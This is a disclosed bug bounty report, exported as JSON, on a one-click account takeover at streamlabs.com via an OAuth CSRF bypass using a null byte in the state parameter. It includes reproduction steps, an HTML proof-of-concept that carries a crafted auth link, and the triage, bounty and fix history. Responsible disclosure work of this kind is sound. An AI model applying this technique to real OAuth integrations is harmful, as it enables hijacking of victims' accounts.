{"id":1046630,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDQ2NjMw","url":"https://hackerone.com/reports/1046630","title":"One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-11-29T19:03:34.763Z","submitted_at":"2020-11-29T19:03:34.859Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"surajbhsl0","url":"/surajbhsl0","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/2onmyKKEzPUL82tycDFvrXa1/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":32972,"url":"https://hackerone.com/logitech","handle":"logitech","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/032/972/8aa1ae9384c034f209edabfd44bac468c0bbbcdb_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/972/8aa1ae9384c034f209edabfd44bac468c0bbbcdb_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Logitech","twitter_handle":"logitech","website":"https://www.logitech.com","about":"Logitech is a consumer electronics manufacturer, specialising in smart home and video collaboration equipment, gaming accessories and peripherals"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-01-06T15:15:53.288Z","bug_reporter_agreed_on_going_public_at":"2021-01-06T14:51:49.372Z","team_member_agreed_on_going_public_at":"2021-01-06T15:15:53.205Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary**\n\nHello Team\n\nI have found a bypass to the this report. #1039749 \n\n**Steps To Reproduce:**\n\n1. Login to attacker's account and go to settings --\u003e account settings.\n\n2. Intercept the request in burp suite and click on merge twitch account.\n\n3. Allow twitch access and once you see a get request in burp with host streamlabs.com and parameters code, scope and state then generate CSRF PoC \n      from burp suite and drop that request. (We dropped this request in order not to consume the code as it can be used only once)\n\n4. Add null byte character in state parameter and host that CSRF PoC on attacker.com and ask victim to visit attacker.com\n\n5. Once victim visits attacker.com attacker's twitch account will be connected to victim's account.\n\n6. Now attacker will login to victim's streamlabs.com using his twitch account.\n\n**PoC:**\n\nLogin to your streamlabs account and Visit the the  link: https://pawned.trueindian1.repl.co and click on the button.\n\n```\n\u003chtml\u003e\n\u003chead\u003e\n\u003cstyle\u003e\nh1 {text-align: center;}\np {text-align: center;}\ndiv {text-align: center;}\n\u003c/style\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\u003ch1\u003eOne Click Account Takeover PoC By C0nquer0rs\u003c/h1\u003e\n\u003cp\u003eClick the button to go to the Streamlabs and check you're account settings.\u003c/p\u003e\n\u003ch1\u003e\u003cbutton onclick=\"document.location='https://streamlabs.com/auth?code=e5p67p5r6vjizvpl2fj756625zv8ra\u0026scope=user_read\u0026state=b33a75be1737978b4c5ea22f7bf53078c86256db-merge%00'\"\u003eClick Me\u003c/button\u003e\u003ch1\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Impact\n\nAttacker can connect his Facebook, you tube, twitch, Mixer, Periscope, Picarto, PayPal with anybody account who visits attacker's website and can easily takeover Victim's streamlabs account.","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":84,"voters":["th3hidd3nmist","birdbird314","m0chan","najeh_halawani","th4nu_0x0","spam404","amr_","imranhudaa","aryan2808","sudi","and 74 more..."],"severity":{"rating":"medium","score":6.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":52462,"asset_type":"URL","asset_identifier":"*.streamlabs.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9956578,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Its using attacker's state token and adding null byte to it.","automated_response":false,"created_at":"2020-11-29T19:40:17.015Z","updated_at":"2020-11-29T19:40:17.015Z","actor":{"username":"surajbhsl0","cleared":false,"url":"/surajbhsl0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2onmyKKEzPUL82tycDFvrXa1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9959277,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @c0nquer0r - I'm discussing this submission internally with the Logitech team. You will be updated as soon as there is additional information to share. Thanks for your patience!","automated_response":false,"created_at":"2020-11-30T09:05:12.223Z","updated_at":"2020-11-30T09:05:12.223Z","actor":{"username":"turtle_shell","cleared":false,"url":"/turtle_shell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/UEHxCfDVKTBNymNpNGb7qwy6/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":9961733,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @turtle_shell \n\nAlso let Logical team know about this report its pending since long #1043933.\n\nThis is CSRF in another module.","automated_response":false,"created_at":"2020-11-30T12:55:22.945Z","updated_at":"2020-11-30T12:55:22.945Z","actor":{"username":"surajbhsl0","cleared":false,"url":"/surajbhsl0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2onmyKKEzPUL82tycDFvrXa1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9963651,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-11-30T16:19:23.398Z","updated_at":"2020-11-30T16:19:23.398Z","additional_data":{"old_severity":"High (8.0)","new_severity":"Medium (6.6)","old_severity_id":919436,"new_severity_id":920097},"actor":{"username":"logi_aron","cleared":false,"url":"/logi_aron","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9966636,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-11-30T20:50:05.632Z","updated_at":"2020-11-30T20:50:05.632Z","actor":{"username":"logi_aron","cleared":false,"url":"/logi_aron","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9966639,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-11-30T20:50:18.621Z","updated_at":"2020-11-30T20:50:18.621Z","actor":{"url":"/logitech","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/972/8aa1ae9384c034f209edabfd44bac468c0bbbcdb_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Logitech"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"logitech","collaborator":{"username":"surajbhsl0","url":"/surajbhsl0"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9966657,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"hi @c0nquer0r, thanks for reporting. this should be fixed now\nplease let us know if you are able to reproduce this.","automated_response":false,"created_at":"2020-11-30T20:52:35.246Z","updated_at":"2020-11-30T20:52:35.246Z","actor":{"username":"logi_harsha","cleared":false,"url":"/logi_harsha","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"surajbhsl0","url":"/surajbhsl0"},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9966957,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@logi_smaddela \n\nThank you for the bounty. I tested it again and this time I am not able to bypass, it looks fixed now.\n\nAlso can you please check this report and let me know if you want to fix this issue. #1043933.\n\n","automated_response":false,"created_at":"2020-11-30T21:39:12.703Z","updated_at":"2020-11-30T21:39:12.703Z","actor":{"username":"surajbhsl0","cleared":false,"url":"/surajbhsl0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2onmyKKEzPUL82tycDFvrXa1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9966985,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We will let you know about it today @c0nquer0r ","automated_response":false,"created_at":"2020-11-30T21:42:28.128Z","updated_at":"2020-11-30T21:42:28.128Z","actor":{"username":"logi_harsha","cleared":false,"url":"/logi_harsha","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9966997,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@logi_smaddela \n\nThanks for your kind reply.\n","automated_response":false,"created_at":"2020-11-30T21:43:39.754Z","updated_at":"2020-11-30T21:43:39.754Z","actor":{"username":"surajbhsl0","cleared":false,"url":"/surajbhsl0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2onmyKKEzPUL82tycDFvrXa1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10286022,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-06T14:51:49.389Z","updated_at":"2021-01-06T14:51:49.389Z","first_to_agree":true,"actor":{"username":"surajbhsl0","cleared":false,"url":"/surajbhsl0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/2onmyKKEzPUL82tycDFvrXa1/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10286212,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-06T15:15:53.221Z","updated_at":"2021-01-06T15:15:53.221Z","actor":{"username":"logi_salman","cleared":false,"url":"/logi_salman","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10286213,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-06T15:15:53.308Z","updated_at":"2021-01-06T15:15:53.308Z","actor":{"username":"logi_salman","cleared":false,"url":"/logi_salman","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"logitech","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}